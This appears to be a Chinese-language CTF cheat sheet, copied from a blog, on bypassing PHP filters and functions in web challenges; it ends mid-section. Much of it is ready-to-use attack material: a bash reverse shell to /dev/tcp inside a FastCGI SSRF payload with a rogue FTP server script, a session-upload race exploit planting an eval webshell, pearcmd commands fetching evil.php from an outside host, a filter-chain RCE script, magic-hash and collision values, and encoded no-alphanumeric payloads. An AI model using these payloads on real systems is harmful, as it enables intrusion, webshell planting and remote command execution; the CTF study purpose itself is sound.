FROM 

```
https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/index.html#create-function
```



---



## 常用函数

phpinfo() #PHP配置页

file_get_contents() #获取文件内容

get_defined_vars() #获取所有文件（包括包含的文件）变量的值



## 变种一句话

**PHP**

```
$_GET[a]($_GET[b]);
```



## 常用php://filter过滤器

- **无过滤器**

  `php://filter/resource=`

- **字符串过滤器**

  `php://filter/read=string.rot13/resource=`

  `php://filter/read=string.toupper/resource=`

  `php://filter/read=string.tolower/resource=`

  `php://filter/read=string.string_tags/resource=`

- **转换过滤器**

  `php://filter/read=convert.base64-encode/resource=`

  `php://filter/read=convert.quoted-printable-encode/resource=`



## 常用路径

- **Nginx**

  复制

  ```
  日志：
  /var/log/nginx/access.log
  
  配置：
  /etc/nginx/nginx.conf
  /usr/local/nginx/conf/nginx.conf
  ```

- **Apache**

  复制

  ```
  日志：
  /var/log/apache/access.log
  /var/log/apache2/access.log
  /var/www/logs/access.log
  /var/log/access.log
  /etc/httpd/logs/access_log
  /var/log/httpd/access_log
  
  配置：
  /etc/apache2/apache2.conf
  /etc/httpd/conf/httpd.conf
  ```



## 绕过

### 关键词

- 函数名、方法名、类名、关键字不区分大小写

```
<?php Show_source('index.php');?>
```

- 动态特性

```
<?php base64_decode('c2hvd19zb3VyY2U=')('index.php');?>
<?php echo ('fil'.'e_get_contents')('/var/www/html/index.php');?>
```

- 16进制

```
<?php ("\x70\x68\x70\x69\x6e\x66\x6f")();?>
```

### 溢出

32位：-2147483648 ~ 2147483647

64位：-9223372036854775808 ~ 9223372036854775807

### 本地访问

X-Forwarded-For, X-Client-ip, Client-ip, X-Real-IP

### 请求方法

查看支持请求方法：OPTIONS

任意文件上传：PUT

### intval()

- 科学计数法

- 进制转换

  十六进制：0x???

  二进制：0b???

  八进制：0???

### is_numeric()

- 特殊字符

  空格、%00、%0a

### preg_match()

- 换行符 %0a（按行匹配类）

  preg_match值只匹配第一行，对于`/^xxx$/`类型，在前端或末尾加上%0a即可绕过。

- 命名空间（\）

  > 在PHP的命名空间默认为`\`，所有的函数和类都在`\`这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。
  >
  > 复制
  >
  > ```
  > #例
  > <?php namespace ccc;\eval($_REQUEST['a']);
  > <?php \system('cat /tmp/flag_XXXX');
  > ```

  参考：[Code-Breaking Puzzles 题解&学习篇](https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-题解-学习篇/#function)

- 符号

  - 分号：`?>`闭合

  - 小括号：

    `?c=include $_GET[x]?>&x=php://filter/read=convert.base64-encode/resource=index.php`

    `?c=require $_GET[x]?>&x=php://filter/read=convert.base64-encode/resource=index.php`

- 数组

  preg_match只能处理字符串，当传入的subject是数组时会返回false。

- PCRE回溯次数限制

  参考：[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

  `pcre.backtrack_limit`给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false。

  复制

  ```
  import requests
   
  url = 'http://x.x.x.x/'
  data = {
      'code': 'very' * 250000 + 'STRING'
  }
  r = requests.post(url, data=data)
  print(r.text)
  ```

### in_array()

- 命名空间（\）

  > 在PHP的命名空间默认为`\`，所有的函数和类都在`\`这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。

  复制

  ```
  #例
  <?php namespace ccc;\eval($_REQUEST['a']);
  <?php \system('cat /tmp/flag_XXXX');
  ```

  参考：[Code-Breaking-Puzzles-题解-学习篇](https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-题解-学习篇/#function)

### $_SERVER[‘QUERY_STRING’]

- URL编码

  $_SERVER[‘QUERY_STRING’]不会进行URLDecode。

- 变量覆盖

  `?_POST[key1]=36d&_POST[key2]=36d`

### $_REQUEST

- POST覆盖

  $_REQUEST同时接受GET和POST的数据，并且POST具有更高的优先值，只需要同时GET和POST有相同的参数，在检测时POST的值就会覆盖GET的值从而绕过。

### file_get_contents()

- 使用 php://input 或 data://text/plain,xxx 写文件

- 文件内容需满足固定字符串前缀

  filter链构造，参考：

  [Solving “includer’s revenge” from hxp ctf 2021 without controlling any files](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)

  [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator)

  [idekCTF 2022 - Paywall](https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH)

### file_put_contents()

- 攻击php-fpm（未授权访问漏洞）

  如果目标主机上正在运行着 `PHP-FPM`，并且有一个`file_put_contents()`函数的参数是可控的，可以使用 `FTP` 协议的被动模式：客户端试图从`FTP`服务器上读取/写入一个文件，服务器会通知客户端将文件的内容读取到一个指定的`IP`和端口上，我们可以指定到`127.0.0.1:9000`，这样就可以向目标主机的 `PHP-FPM` 发送一个任意的数据包，从而执行代码，造成`SSRF`。

  `file_put_contents($_GET['file'], $_GET['data']);`

  先用 `gopherus` 生成一个反弹`shell`的`payload`，截取 `_` 后面的部分

  `/var/www/html/index.php`

  `bash -c "bash -i >& /dev/tcp/[IP]/[Port] 0>&1"`

  关于`FTP`的[返回码](https://blog.csdn.net/wangzhufei/article/details/86177015)，我们看到`227`：

  > `Entering Passive Mode <h1,h2,h3,h4,p1,p2> 进入被动模式(h1,h2,h3,h4,p1,p2)`

  我们可以用来进入被动模式，`h`和`p`分别为地址和端口，搭建一个恶意的 `ftp` 服务器：

  复制

  ```
  import socket
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
  s.bind(('0.0.0.0', 123))
  s.listen(1)
  conn, addr = s.accept()
  conn.send(b'220 welcome\n')
  conn.send(b'331 Please specify the password.\n')
  conn.send(b'230 Login successful.\n')
  conn.send(b'200 Switching to Binary mode.\n')
  conn.send(b'550 Could not get the file size.\n')
  conn.send(b'150 ok\n')
  conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n') #STOR / (2)
  conn.send(b'150 Permission denied.\n')
  conn.send(b'221 Goodbye.\n')
  conn.close()
  ```

  启动服务器之后再监听反弹的端口：

  `http://ip:8080/ftp.php?file=ftp://@ip:123/&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0F%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F!SCRIPT_FILENAME/usr/share/nginx/html/phpinfo.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip/1234%200%3E%261%22%27)%3Bdie(%27-----Made-by-SpyD3r-----%0A%27)%3B%3F%3E%00%00%00%00`

  参考：[教你用 FTP SSRF 打穿内网](https://whoamianony.top/2021/10/24/Web安全/教你用 FTP SSRF 打穿内网/)

- array绕过关键字

  file_put_contents的data参数可以是个array，可以通过构造特别的get请求来发送一个data的array来绕过。

  > `file_put_contents(file,data,mode,context)`
  >
  > file: 必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。
  >
  > data: 可选。规定要写入文件的数据。可以是字符串、数组或数据流。

复制

```
for i in range(len(s)):
    params['data[{i}]'.format(i=str(i))]=bytes([s[i]])
```

### sha1()比较

- 以数组为参数

  sha1()函数无法处理数组类型，将报错并返回false。

- 特殊情况汇总

  > 10932435112: 0e07766915004133176347055865026311692244
  > aaroZmOk: 0e66507019969427134894567494305185566735
  > aaK1STfY: 0e76658526655756207688271159624026011393
  > aaO8zKZF: 0e89257456677279068558073954252716165668
  > aa3OFF9m: 0e36977786278517984959260394024281014729
  >
  > 0e1290633704: 0e19985187802402577070739524195726831799

- 比较缺陷利用（限===强类型情况）

  两组经过url编码后的值：

  复制

  ```
  a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
  b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
  ```

- 文件碰撞

  [collisions](https://github.com/corkami/collisions/tree/master/examples/free)

### md5()比较

- 比较缺陷利用（限==弱类型情况）

  > QNKCDZO - 0e830400451993494058024219903391
  >
  > PJNPDWY: 0e291529052894702774557631701704
  > NWWKITQ: 0e763082070976038347657360817689
  > NOOPCJF: 0e818888003657176127862245791911
  > MMHUWUV: 0e701732711630150438129209816536
  > MAUXXQC: 0e478478466848439040434801845361
  > IHKFRNS: 0e256160682445802696926137988570
  > GZECLQZ: 0e537612333747236407713628225676
  > GGHMVOE: 0e362766013028313274586933780773
  > GEGHBXL: 0e248776895502908863709684713578
  > EEIZDOI: 0e782601363539291779881938479162
  > DYAXWCA: 0e424759758842488633464374063001
  > DQWRASX: 0e742373665639232907775599582643
  > BRTKUJZ: 00e57640477961333848717747276704
  > ABJIHVY: 0e755264355178451322893275696586
  >
  > 240610708 - 0e462097431906509019562988736854
  > s878926199a - 0e545993274517709034328855841020
  > s155964671a - 0e342768416822451524974117254469
  > s214587387a - 0e848240448830537924465865611904
  > s878926199a - 0e545993274517709034328855841020
  > s1091221200a - 0e940624217856561557816327384675
  >
  > aaaXXAYW: 0e540853622400160407992788832284
  > aabg7XSs: 0e087386482136013740957780965295
  > aabC9RqS: 0e041022518165728065344349536299
  >
  > 0e215962017 - 0e291242476940776845150308577824

- 比较缺陷利用（限===强类型情况）

  工具：fastcoll

  两组经过url编码后的值：

  复制

  ```
  a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
  
  b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
  ```

- 文件碰撞

  [collisions](https://github.com/corkami/collisions/tree/master/examples/free)

- 以数组为参数

  md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。

- NaN 和 INF

  `NAN`和`INF`，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至`NAN===NAN`都是false，但`md5('NaN')===md5('NaN')`为true。

- md5(string,raw)

  > **md5(string,raw)**
  >
  > string 必需。规定要计算的字符串。
  > raw 可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式；FALSE - 默认，32 字符十六进制数。

  `ffifdyop`，经过md5函数后结果为 `'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c`；

  `129581926211651571912466741651878684928`，经过md5函数后结果为 `\x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8`；

### create_function()

- 代码注入

  源码 `$func('',$arg)` ：

  `$func='create_function';`

  `$arg='2;}phpinfo();//'` 或 `$arg='2;}require(base64_decode(xxx));var_dump(get_defined_vars());//`

- 返回值：匿名函数

  `$func = create_function("","die('end.');");`

  创建一个`$func`的匿名函数，函数的作用是输出字符串。

  匿名函数有真正的名字，为`%00lambda_%d` （%d格式化为当前进程的第n个匿名函数，n的范围0-999）

### call_user_func()

- 调用类静态方法

  `call_user_func('Func::_One','one')`

  `call_user_func(['Func','_One'])`

  参考：https://cloud.tencent.com/developer/article/1411010

  `call_user_func(Closure::fromCallable,[Closure,fromCallable])('system')('whoami')`

  > PHP 7.4
  >
  > Closure::fromCallable 使用当前范围从给定的 callback 创建并返回一个新的匿名函数。此方法检查 callback 函数在作用域是否可调用， 如果不能，就抛出 TypeError 。
  >
  > 数组作为参数二次调用出 Closure::fromCallable 然后 Closure 加载后面第一个参数 system 形成回调函数然后加载第二个参数变成 system 的参数。

### escapeshellarg()

> escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符。

- 不可见字符插入（%80-%ff）

### escapeshellcmd()

> escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义；反斜线（`\`）会在以下字符之前插入： `&#;`|*?~<>^()[]{}$, \x0A, \xFF`；`'` 和 `"` 仅在不配对儿的时候被转义；在 Windows 平台上，所有这些字符以及 `%` 和 `!` 字符都会被空格代替。

- escapeshellarg()+escapeshellcmd() 配对：

  多个参数注入：[PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)

### ereg() / eregi()

- NULL截断漏洞

  ereg()函数存在NULL截断漏洞,可以%00截断，遇到%00则默认为字符串的结束，所以可以绕过一些正则表达式的检查。

  ereg()只能处理字符串的，遇到数组做参数返回NULL。

### strpos()

- 以数组为参数

  strpos()函数如果传入数组，便会返回NULL。

- 二次编码绕关键字

  参考：https://bugs.php.net/bug.php?id=76671

### strcmp()

- 函数缺陷

  > `strcmp()`函数比较两个字符串(区分大小写），定义中是比较**字符串类型**的，但如果输入其他类型这个函数将发生错误，在官方文档的说明中说到在`php 5.2`版本之前，利用`strcmp`函数将数组与字符串进行比较会返回`-1`，但是从`5.3`开始，会返回`0`。

### add_slashes()

- `${phpinfo()}`

### preg_replace()

- 代码执行（限/e模式）

  > `preg_replace`(PHP 5.5)
  > 功能 ： 函数执行一个正则表达式的搜索和替换
  > 定义 ： `mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )`
  > 搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换
  > `$pattern` 存在 /e 模式修正符，允许代码执行
  > /e 模式修正符，是 preg_replace() 将 `$replacement` 当做php代码来执行

### filter_var()

- **FILTER_VALIDATE_EMAIL**

  形式：`local-part@domain-part`

  1. 邮箱local-part部分可以用双引号包裹，双引号内即可填入任意字符，如`"Joe'Blow"@example.com`

- **FILTER_VALIDATE_URL**

  1. `0://www.baidu.com;`

### is_file() / file_exists()

- 超过20次软链接后可以绕过：

  `?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php`

### require_once()

- 包含的软连接层数较多时，hash匹配会直接失效造成重复包含，同 `is_file()`

  参考：[php源码分析 require_once 绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235)

### include()

- 日志包含

  URL：`?x=/var/log/nginx/access.log`

  修改`User-Agent`为`<?php highlight_file('xxx.php'); ?>`

- 有后缀绕过

  `?c=data:text/plain,<?php system('ls')?>`

  `?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4`

  `?c=data:,<?php system('ls')?>`

- file协议包含

  `file:///etc/passwd`

  `file://localhost/etc/passwd`

- zip/phar协议包含（有特定后缀）

  这个方法适用于验证包含文件为特定后缀时。

  - **zip**

    首先新建一个zip文件，里面压缩着一个php脚本。

    然后构造`zip://php.zip#php.jpg`：

    `http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg`

  - **phar** (PHP版本>5.3.0)

    首先要用phar类打包一个phar标准包：

    复制

    ```
    <?php
    $p = new PharData(dirname(__FILE__).'./test.zip', 0,'test',Phar::ZIP);
    $p->addFromString('test.txt', '<?php phpinfo();?>');
    ?>
    ```

会生成一个zip的压缩文件。然后构造

```
http://127.0.0.1/file.php?file=phar://php.zip/php.jpg
```

- 利用**session.upload_progress**

  可以利用`session.upload_progress`将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。

  如果`session.auto_start=On` ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。

  session有一个默认选项，`session.use_strict_mode`默认值为`0`。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置`PHPSESSID=TGAO`，PHP将会在服务器上创建一个文件：`/tmp/sess_TGAO`。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值由`ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值`组成，最后被写入sess_文件里。

  默认配置`session.upload_progress.cleanup = on`导致文件上传后，session文件内容立即清空，此时我们可以利用竞争，在session文件内容清空前进行包含利用。

  参考：https://www.freebuf.com/vuls/202819.html

  **常见PHP-Session存放位置**

  复制

  ```
  /var/lib/php5/sess_PHPSESSID
  /var/lib/php7/sess_PHPSESSID
  /var/lib/php/sess_PHPSESSID
  /tmp/sess_PHPSESSID
  /tmp/sessions/sess_PHPSESSED
  ```

  复制

  ```
  #coding=utf-8
  import io
  import requests
  import threading
  sessid = 'Q'
  data = {"cmd":"system('cat fl0g.php');"}
  url = 'http://6bad481c-1da6-4a89-92f6-db28a56e4f28.chall.ctf.show/index.php'
  def write(session):
  	while True:
  		f = io.BytesIO(b'a' * 1024 * 50)
  		resp = session.post(url, data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('q.txt',f)}, cookies={'PHPSESSID': sessid} )
  def read(session):
  	while True:
  		resp = session.post(url+'?file=/tmp/sess_'+sessid,data=data)
  		if 'q.txt' in resp.text:
  			print(resp.text)
  			event.clear()
  		else:
  			#print("[+++++++++++++]retry")
  			pass
  if __name__=="__main__":
  	event=threading.Event()
  	with requests.session() as session:
  		for i in range(1,30): 
  			threading.Thread(target=write,args=(session,)).start()
  		for i in range(1,30):
  			threading.Thread(target=read,args=(session,)).start()
  	event.set()
  ```

- 利用**PEAR** （开启register_argc_argv）

  可能路径：

  复制

  ```
  /usr/local/lib/php/pearcmd.php
  /usr/share/pear/pearcmd.php
  ```

  PEAR是可重用的PHP组件框架和系统分发，会随PHP安装时自动安装。

  `?file=/usr/local/lib/php/pearcmd.php&+download+http://vps/eval.php`

  `?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/eval.php+-d+man_dir=<?eval($_POST[0]);?>+-s+ HTTP/1.1`（Burpsuite防浏览器转码）

  `?file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://ip/evil.php` （路径：`/tmp/pear/download/evil.php`）

  `?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?eval($_POST[0]);?>+/tmp/hello.php`（路径：`/tmp/hello.php`）

  复制

  ```
   <?php
  header('Content-Disposition: attachment; filename="shell.php"');
   echo <<<EOF
  <?php
  system(\$_GET[0]);
  ?>
  EOF;
  ```

  `?file=/tmp/pear/download/shell.php&0=/readflag`

- **PHPFilterChain RCE**

  参考：

  [LFI 新姿势学习](https://k1te.cn/2022/01/10/LFI学习/)

  [hxp CTF 2021 - The End Of LFI?](https://tttang.com/archive/1395/)

  复制

  ```
  import requests
  
  url = ""
  file_to_use = "/var/hint"
  command = "id"
  
  #<?=`$_GET[0]`;;?>
  base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"
  
  conversions = {
      'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
      'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
      'C': 'convert.iconv.UTF8.CSISO2022KR',
      '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
      '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
      'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
      's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
      'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
      'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
      'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
      'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
      '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
      'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
      'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
      'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
      'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
      '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
      '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
  }
  
  
  # generate some garbage base64
  filters = "convert.iconv.UTF8.CSISO2022KR|"
  filters += "convert.base64-encode|"
  # make sure to get rid of any equal signs in both the string we just generated and the rest of the file
  filters += "convert.iconv.UTF8.UTF7|"
  
  
  for c in base64_payload[::-1]:
          filters += conversions[c] + "|"
          # decode and reencode to get rid of everything that isn't valid base64
          filters += "convert.base64-decode|"
          filters += "convert.base64-encode|"
          # get rid of equal signs
          filters += "convert.iconv.UTF8.UTF7|"
  
  filters += "convert.base64-decode"
  
  final_payload = f"php://filter/{filters}/resource={file_to_use}"
  
  r = requests.get(url, params={
      "0": command,
      "file": final_payload
  })
  
  print(r.text)
  ```

- **CNEXT exploits**

  CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行

  参考：

  [【翻译】从设置字符集到RCE：利用 GLIBC 攻击 PHP 引擎（篇一）](https://xz.aliyun.com/t/14690)

  原作者给出的exp:

  https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py

### die() / exit()

参考：https://www.anquanke.com/post/id/202510

- 过滤关键词

  urlencode

- 过滤`%25`

  二次编码：`a:%6%31 b:%6%32 i:%6%39 q:%7%31 r:%7%32 u:%7%35 U:%5%35`

- allow_url_include=Off

  > file_get_contents 允许使用 data URI，会直接返回后面的内容，很奇怪的是，在 allow_url_include=Off 的情况下，不允许 require_once data URI 的，但是如果 `data:,XXX` 是一个目录名的话，就会放开限制。

  复制

  ```
  $ php -a
  Interactive mode enabled
  
  php > echo file_get_contents('data:,123456/ricky');
  123456/ricky
  php > echo require_once('data:,123456/ricky');
  flag{xxxxxxxxxx}
  php >
  ```

### open()

PHP原生类：`ZipArchive::open($filename,$flags)`

调用可删除文件：`ZipArchive::open('xxx',ZipArchive::OVERWRITE)`=`ZipArchive::open('xxx',8)`

### parse_url()

> URL 格式： `scheme://user:password@address:port/path?query#fragment`

参考：https://www.cnblogs.com/tr1ple/p/11137159.html

- //绕过

  把//认为是相对路径（PHP<5.4.7）。

  如果是//，则被解析成host，后面的内容如果有/，被解析出path，而不是query了。

- ///绕过

  三个斜杠导致严重不合格的URL，parse_url() 返回FALSE。

### basename()

返回路径中的文件名部分，会去掉文件名开头的非ASCII值。

```
var_dump(basename("\xffconfig.php")); => config.php
var_dump(basename("config.php\xff")); => config.php
```

### spl_autoload_register()

PHP框架中有自动加载机制，autoload机制可以使得PHP程序有可能在使用类时才自动包含类文件，而不是一开始就将所有的类文件include进来，这种机制也称为lazy loading。

autoload大致可以使用两种方法：`__autoload` 和 `spl` 方法。

spl的autoload系列函数使用一个autoload调用堆栈，可以使用 `spl_autoload_register` 注册多个自定义的autoload函数。

`spl_autoload_register()` 如果不指定参数，就会自动包含 `类名.php` 或 `类名.inc` 的文件，并加载其中的“类名”类。

a. 上传webshell，后缀为 `.inc`，被重命名为 `xxxx.inc`；

b. 序列化一个类名为 `xxxx` 的类对象；

c. 将序列化以后的字符串作为cookie，发送到服务器上；

d. 服务器反序列化这个字符串后，将会自动加载 `xxxx` 类，由于之前 `spl_autoload_register` 函数注册的方法，会自动加载 `xxxx.inc`，从而造成文件包含漏洞。

------

复制

```
<?php
spl_autoload_register('system');
new ls();
```

当 `spl_autoload_register` 的参数不为空时，new一个类 `ls`，如果该 `ls` 类未定义，程序会寻找
`system` 函数，并将 `ls` 作为参数，执行 `system` 函数，即执行了 `system('ls');`。

当 `spl_autoload_register` 的参数为空时。然后new一个xxx类，如果该xxx类未定义，程序会在
工作空间中寻找 `xxx.php` 或 `xxx.inc`，并将其包含。

### putenv()+system()

参考：[我是如何利用环境变量注入执行任意命令](https://tttang.com/archive/1450/)

```
envs[BASH_FUNC_echo%25%25]=()%20{%20id;%20}
```

### ini_set

```
ini_set($name,$value);` => `name=error_log&value=/var/www/html/out.php
```

### mb_strpos+mb_substr

利用mb_strpos与mb_substr这两个函数对某些不可见字符的解析差异导致的，可以利用特殊的不可见字符实现反序列化字符串逃逸。

例如 `%9f` 可以逃逸出一个字符，所以需要逃出几个字符就在前面添加几个 `%9f`。

参考：

https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/

[https://www.cnblogs.com/gxngxngxn/p/18187578 逃跑大师](https://www.cnblogs.com/gxngxngxn/p/18187578)

### 参数特性

![img](https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/1567560448_5d6f13004035f.jpeg)

- 参数中的`+`、`[`、空格、`.`均会变为`_`

- 参数形式`A_B.C`：使用`A[B.C`传入

  

### 无字母/数字/特定符号RCE

- 取反（`~`）

  `phpinfo()` → `(~%8F%97%8F%96%91%99%90)()`

  `system('ls')` → `(~%8C%86%8C%8B%9A%92)(~%93%8C)`

- 异或（`^`）

  `phpinfo()` → `$_GET[x]&x=phpinfo` → `${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}();&x=phpinfo`

  `system('ls')` → `$_GET[x]($_GET[y])&x=system&y=ls` → `${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}(${%A0%A0%A0%A0^%FF%E7%E5%F4}{y});&x=system&y=ls`

  无字母情形：

